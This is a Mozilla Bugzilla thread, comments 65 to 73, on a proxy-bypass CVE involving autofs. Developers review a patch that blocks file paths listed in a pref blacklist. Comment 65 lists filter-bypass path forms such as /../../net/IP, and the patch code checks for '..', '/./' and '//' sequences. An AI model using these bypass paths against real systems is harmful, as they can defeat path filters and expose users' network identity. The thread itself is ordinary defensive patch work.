   href="/show_bug.cgi?id=1413868">bug 1413868</a> that seems to work in blocking file access to paths based on a pref blacklist.
I will post it for review shortly, hopefully with some tests :)</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(valentin.gosu)</span></div></div></div><div class="change-set" id="c65"><div class="comment" data-id="13294368" data-no="65"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-65" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a15112605_415378"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_415378" id="a15112605_415378"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-65"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-65" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c65">Comment 65</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-21 08:58 PDT" data-time="1526918294">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-65">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8979286"
         class="attachment patch obsolete"
         data-id="8979286" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="bug1412081-file-blacklist.patch">
      <meta itemprop="contentSize" content="18476">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8979286">
          <a class="link" href="attachment.cgi?id=8979286&amp;action=diff">
        <span id="att-8979286-description" itemprop="description">WIP-patch-and-gtest</span></a> (obsolete)
        — <a href="attachment.cgi?id=8979286&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1412081&attachment=8979286">Splinter Review</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-65" data-comment-id="13294368">This WIP patch goes on top of <span class="bz_obsolete"><a href="/attachment.cgi?id=8972049" name="attach_8972049" title="v1.1">attachment 8972049</a> <a href="/attachment.cgi?id=8972049&amp;action=edit" title="v1.1">[details]</a> <a href="/attachment.cgi?id=8972049&amp;action=diff" title="v1.1">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1413868&amp;attachment=8972049'>[review]</a>. In the gtest I wrote a few ways I found to bypass the filter (which I then fixed), but there are a few others I didn't get to yet.
A few examples of paths that could be used to bypass the filter:
/./net/IP
/../../net/IP
/other/../net/IP
///net/IP</pre></div><div class="change-set" id="c66"><div class="comment" data-id="13297367" data-no="66"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-66" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_269762" id="a15112605_415378"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_269762" id="a15112605_415378"><a class="email " href="/user_profile?user_id=269762" > <span class="fna">Honza Bambas (:mayhemer)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-66"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-66" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c66">Comment 66</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-22 11:00 PDT" data-time="1527012046">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-66">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-66" data-comment-id="13297367">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8979286" name="attach_8979286" title="WIP-patch-and-gtest">attachment 8979286</a> <a href="/attachment.cgi?id=8979286&amp;action=edit" title="WIP-patch-and-gtest">[details]</a> <a href="/attachment.cgi?id=8979286&amp;action=diff" title="WIP-patch-and-gtest">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1412081&amp;attachment=8979286'>[review]</a>
WIP-patch-and-gtest

Review of <span class="bz_obsolete"><a href="/attachment.cgi?id=8979286" name="attach_8979286" title="WIP-patch-and-gtest">attachment 8979286</a> <a href="/attachment.cgi?id=8979286&amp;action=edit" title="WIP-patch-and-gtest">[details]</a> <a href="/attachment.cgi?id=8979286&amp;action=diff" title="WIP-patch-and-gtest">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1412081&amp;attachment=8979286'>[review]</a>:
-----------------------------------------------------------------

::: netwerk/test/gtest/TestFilePreferences.cpp
&#64;&#64; +1,1 &#64;&#64;
<span class="quote">&gt; +#include &quot;gtest/gtest.h&quot;</span >

should this live in xpcom?

::: xpcom/io/FilePreferences.cpp
&#64;&#64; +70,5 &#64;&#64;
<span class="quote">&gt; +    Unused &lt;&lt; p.ReadUntil(Tokenizer::Token::Char(','), path);
&gt; +    if (!path.IsEmpty()) {
&gt; +      PathBlacklist().AppendElement(path);
&gt; +    }
&gt; +  } while (!p.CheckEOF());</span >

you don't need Record()
you have to read (check) the ',' character
the loop should be `while (!p.CheckEOF()) { do stuff; }
you may want to do path.Trim() as you don't skip whitespaces</pre></div><div class="change-set" id="a18038314_580382"><div class="change" id="aa18038314_580382">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_580382" id="a18038314_580382"><img src="https://secure.gravatar.com/avatar/15b9b3783e4671cd882bff1316df14c9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_580382" id="a18038314_580382"><a class="email " href="/user_profile?user_id=580382" > <span class="fna">Julien Cristau [:jcristau]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a18038314_580382"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a18038314_580382">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#a18038314_580382">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-23 07:04 PDT" data-time="1527084248">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox60&amp;o1=isnotempty">status-firefox60</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox60&amp;o1=equals&amp;v1=fix-optional">fix-optional</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox60&amp;o1=equals&amp;v1=wontfix">wontfix</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox61&amp;o1=isnotempty">status-firefox61</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox61&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox61&amp;o1=equals&amp;v1=fix-optional">fix-optional</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox62&amp;o1=isnotempty">status-firefox62</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox62&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox_esr60&amp;o1=isnotempty">status-firefox-esr60</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox_esr60&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox_esr60&amp;o1=isnotempty">tracking-firefox-esr60</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox_esr60&amp;o1=equals&amp;v1=%3F">?</a></div></div></div><div class="change-set" id="c67"><div class="comment" data-id="13409804" data-no="67"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-67" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_349211" id="a18038314_580382"><img src="https://secure.gravatar.com/avatar/34a87f79fc3dd6985e4a1af2b4870a19?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_349211" id="a18038314_580382"><a class="email " href="/user_profile?user_id=349211" > <span class="fna">Georg Koppen</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-67"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-67" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c67">Comment 67</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-06-17 22:46 PDT" data-time="1529300805">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-67">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-67" data-comment-id="13409804">Valentin: Do you have an updated WIP patch we could test/include in our upcoming alpha? Right now, this is the only blocker for us for switching Tor Browser to ESR 60 next week in our alpha series: We can't ship the alpha with no workaround for this (for us) critical issue given that we &quot;fixed&quot; it a couple of months ago with an emergency release during the ESR 52 cycle.</pre><div class="activity"><div class="change">Flags: needinfo?(valentin.gosu)</div></div></div><div class="change-set" id="c68"><div class="comment" data-id="13410796" data-no="68"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-68" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a18038314_580382"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_415378" id="a18038314_580382"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-68"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-68" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c68">Comment 68</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-06-18 09:28 PDT" data-time="1529339333">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-68">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8985964"
         class="attachment patch obsolete"
         data-id="8985964" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="bug1412081-file-blacklist.patch">
      <meta itemprop="contentSize" content="18177">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8985964">
          <a class="link" href="attachment.cgi?id=8985964&amp;action=diff">
        <span id="att-8985964-description" itemprop="description">patch</span></a> (obsolete)
        — <a href="attachment.cgi?id=8985964&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1412081&attachment=8985964">Splinter Review</a>
      </div>
    </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8985964&amp;action=edit"
           title="patch"
           class=""
        >Attachment #8985964</a> -
        Flags: review?(honzab.moz)</div></div></div><div class="change-set" id="a20293401_415378"><div class="change" id="aa20293401_415378">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a20293401_415378"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_415378" id="a20293401_415378"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a20293401_415378"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a20293401_415378">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#a20293401_415378">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-06-18 09:28 PDT" data-time="1529339335">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8979286&amp;action=edit"
           title="WIP-patch-and-gtest"
           class=""
        >Attachment #8979286</a> -
        Attachment is obsolete: true</div></div></div><div class="change-set" id="c69"><div class="comment" data-id="13410804" data-no="69"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-69" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a20293401_415378"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_415378" id="a20293401_415378"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-69"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-69" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c69">Comment 69</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-06-18 09:32 PDT" data-time="1529339549">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-69">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-69" data-comment-id="13410804">(In reply to Georg Koppen from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c67">comment #67</a>)
<span class="quote">&gt; Valentin: Do you have an updated WIP patch we could test/include in our
&gt; upcoming alpha? Right now, this is the only blocker for us for switching Tor
&gt; Browser to ESR 60 next week in our alpha series: We can't ship the alpha
&gt; with no workaround for this (for us) critical issue given that we &quot;fixed&quot; it
&gt; a couple of months ago with an emergency release during the ESR 52 cycle.</span >

Check out <span class="bz_obsolete"><a href="/attachment.cgi?id=8985964" name="attach_8985964" title="patch">attachment 8985964</a> <a href="/attachment.cgi?id=8985964&amp;action=edit" title="patch">[details]</a> <a href="/attachment.cgi?id=8985964&amp;action=diff" title="patch">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1412081&amp;attachment=8985964'>[review]</a>. I think it's fairly final. I'm just waiting for Honza's review and writing a few more tests for it.</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(valentin.gosu)</span></div></div></div><div class="change-set" id="c70"><div class="comment" data-id="13411730" data-no="70"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-70" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_269762" id="a20293401_415378"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_269762" id="a20293401_415378"><a class="email " href="/user_profile?user_id=269762" > <span class="fna">Honza Bambas (:mayhemer)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-70"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-70" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c70">Comment 70</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-06-18 17:58 PDT" data-time="1529369928">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-70">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-70" data-comment-id="13411730">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8985964" name="attach_8985964" title="patch">attachment 8985964</a> <a href="/attachment.cgi?id=8985964&amp;action=edit" title="patch">[details]</a> <a href="/attachment.cgi?id=8985964&amp;action=diff" title="patch">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1412081&amp;attachment=8985964'>[review]</a>
patch

Review of <span class="bz_obsolete"><a href="/attachment.cgi?id=8985964" name="attach_8985964" title="patch">attachment 8985964</a> <a href="/attachment.cgi?id=8985964&amp;action=edit" title="patch">[details]</a> <a href="/attachment.cgi?id=8985964&amp;action=diff" title="patch">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1412081&amp;attachment=8985964'>[review]</a>:
-----------------------------------------------------------------

giving r+ with comments only because this is high priority and I may be offline few following days.  but there are things that MUST be addressed before landing.  please read all the comments.

::: xpcom/io/FilePreferences.cpp
&#64;&#64; +64,5 &#64;&#64;
<span class="quote">&gt; +  nsAutoCString blacklist;
&gt; +  Preferences::GetCString(&quot;network.file.path_blacklist&quot;, blacklist);
&gt; +  Tokenizer p(blacklist);
&gt; +  while (!p.CheckEOF()) {
&gt; +    nsCString path;</span >

please use nsDependentCSubstring to save memory copying

&#64;&#64; +69,5 &#64;&#64;
<span class="quote">&gt; +    Unused &lt;&lt; p.ReadUntil(Tokenizer::Token::Char(','), path);
&gt; +    path.Trim(&quot; &quot;);
&gt; +    if (!path.IsEmpty()) {
&gt; +      PathBlacklist().AppendElement(path);
&gt; +    }</span >

nit: you must consume the ',' token

&#64;&#64; +236,5 &#64;&#64;
<span class="quote">&gt; +bool IsAllowedPath(const nsACString&amp; aFilePath)
&gt; +{
&gt; +  for (const auto&amp; prefix : PathBlacklist()) {
&gt; +    if (StringBeginsWith(aFilePath, prefix)) {
&gt; +      if (aFilePath.Length() != prefix.Length() &amp;&amp;</span >

maybe a nit for better readability: aFilePath.Length() &gt; prefix.Length()

::: xpcom/io/nsLocalFileUnix.cpp
&#64;&#64; +141,5 &#64;&#64;
<span class="quote">&gt;        dirPath.IsEmpty()) {
&gt;      return NS_ERROR_FILE_INVALID_PATH;
&gt;    }
&gt;  
&gt; +  // When enumerating the directory, the paths have a slash at the end.</span >

have or don't have?

OTOH, can we even get here?  few lines above you do aParent-&gt;GetNativePath().  has not the aParent object already been subjected to the check for path allowance?

&#64;&#64; +329,5 &#64;&#64;
<span class="quote">&gt; +      FindInReadable(NS_LITERAL_CSTRING(&quot;/./&quot;), mPath) ||
&gt; +      FindInReadable(NS_LITERAL_CSTRING(&quot;..&quot;), mPath) ||
&gt; +      FindInReadable(NS_LITERAL_CSTRING(&quot;//&quot;), mPath)) {
&gt; +    mPath.Truncate();
&gt; +    return NS_ERROR_FILE_UNRECOGNIZED_PATH;</span >

OK, this can't be here.  This was my main concern with the previous patch.  This can potentially break things.  It definitely changes behavior, is not behind the pref and definitely cannot be uplifted like this to ESR.

Move these lines INSIDE FilePreferences::IsAllowedPath and do it ONLY when there are names (prefixes) to be blacklisted or do the normalization as I do in my base patch (you will need the normalizer be a template and derive from TTokenizer&lt;chat_path_t&gt;, like #ifdef XPWIN typedef char16_t char_path_t; #else typedef char char_path_t; #endif)

But I think this &quot;has special dir -&gt; throw&quot; approach if fine when off by default.  

OTOH, note that paths get here likely already normalized, at least on windows I could see that navigating to file:///c:/./././././././././././ is file://c:/ when coming to InitWithPath, no idea where that happens, but I made sure no smb request/lookup was triggered before InitWithPath was entered for file://///share uris.


hmm... we should make sure there is no code in upper layers that may look for /. or /.. in the path and call some system API normalization function that could trigger the smb/net lookup.


then, just for case, remember that ':' is a directory delimiter on osx!

&#64;&#64; +576,5 &#64;&#64;
<span class="quote">&gt; +  }
&gt; +
&gt; +  if (FindInReadable(NS_LITERAL_CSTRING(&quot;..&quot;), aFragment)) {
&gt; +    return NS_ERROR_FILE_UNRECOGNIZED_PATH;
&gt; +  }</span >

same case as above.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8985964&amp;action=edit"
           title="patch"
           class=""
        >Attachment #8985964</a> -
        Flags: review?(honzab.moz) &rarr; review+</div></div></div><div class="change-set" id="c71"><div class="comment" data-id="13413830" data-no="71"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-71" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a20293401_415378"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_415378" id="a20293401_415378"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-71"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-71" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c71">Comment 71</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-06-19 15:48 PDT" data-time="1529448509">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-71">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-71" data-comment-id="13413830"><a rel="nofollow" href="https://treeherder.mozilla.org/#/jobs?repo=try&amp;revision=baa5cfd682dcd30471a5c81bb00c1fa6efdeaced">https://treeherder.mozilla.org/#/jobs?repo=try&amp;revision=baa5cfd682dcd30471a5c81bb00c1fa6efdeaced</a></pre></div><div class="change-set" id="c72"><div class="comment" data-id="13413831" data-no="72"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-72" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a20293401_415378"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_415378" id="a20293401_415378"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-72"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-72" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c72">Comment 72</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-06-19 15:48 PDT" data-time="1529448528">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-72">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8986314"
         class="attachment patch obsolete"
         data-id="8986314" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="bug1412081-file-blacklist.patch">
      <meta itemprop="contentSize" content="27942">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8986314">
          <a class="link" href="attachment.cgi?id=8986314&amp;action=diff">
        <span id="att-8986314-description" itemprop="description">patch</span></a> (obsolete)
        — <a href="attachment.cgi?id=8986314&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1412081&attachment=8986314">Splinter Review</a>
      </div>
    </div></div><div class="change-set" id="a20402598_415378"><div class="change" id="aa20402598_415378">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a20402598_415378"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_415378" id="a20402598_415378"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a20402598_415378"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a20402598_415378">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#a20402598_415378">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-06-19 15:48 PDT" data-time="1529448532">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8985964&amp;action=edit"
           title="patch"
           class=""
        >Attachment #8985964</a> -
        Attachment is obsolete: true</div></div></div><div class="change-set" id="c73"><div class="comment" data-id="13413885" data-no="73"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-73" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_415378" id="a20402598_415378"><img src="https://secure.gravatar.com/avatar/dedff9d4500fcbc5cdd1cd270f044b33?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_415378" id="a20402598_415378"><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-73"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-73" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c73">Comment 73</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-06-19 16:02 PDT" data-time="1529449379">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-73">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-73" data-comment-id="13413885">(In reply to Honza Bambas (:mayhemer) from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c70">comment #70</a>)
<span class="quote">&gt; Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8985964" name="attach_8985964" title="patch">attachment 8985964</a> <a href="/attachment.cgi?id=8985964&amp;action=edit" title="patch">[details]</a> <a href="/attachment.cgi?id=8985964&amp;action=diff" title="patch">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1412081&amp;attachment=8985964'>[review]</a>
&gt; &gt; +  while (!p.CheckEOF()) {
&gt; &gt; +    nsCString path;
&gt; 
&gt; please use nsDependentCSubstring to save memory copying</span >

I kept it nsCString to be able to still do path.Trim(&quot; &quot;)
Since this only happens once, at startup, the extra number of copies should be minimal.

<span class="quote">&gt; &gt; +  // When enumerating the directory, the paths have a slash at the end.
&gt; have or don't have?</span >

Changed it to must have.

<span class="quote">&gt; OTOH, can we even get here?  few lines above you do
&gt; aParent-&gt;GetNativePath().  has not the aParent object already been subjected
&gt; to the check for path allowance?</span >

Yes, but that depends on the blacklisted path. If the parent name is /folder and we blacklisted /folder/ it will not match, but all of its children will.

<span class="quote">&gt; 
&gt; &#64;&#64; +329,5 &#64;&#64;
&gt; &gt; +      FindInReadable(NS_LITERAL_CSTRING(&quot;/./&quot;), mPath) ||
&gt; &gt; +      FindInReadable(NS_LITERAL_CSTRING(&quot;..&quot;), mPath) ||
&gt; &gt; +      FindInReadable(NS_LITERAL_CSTRING(&quot;//&quot;), mPath)) {
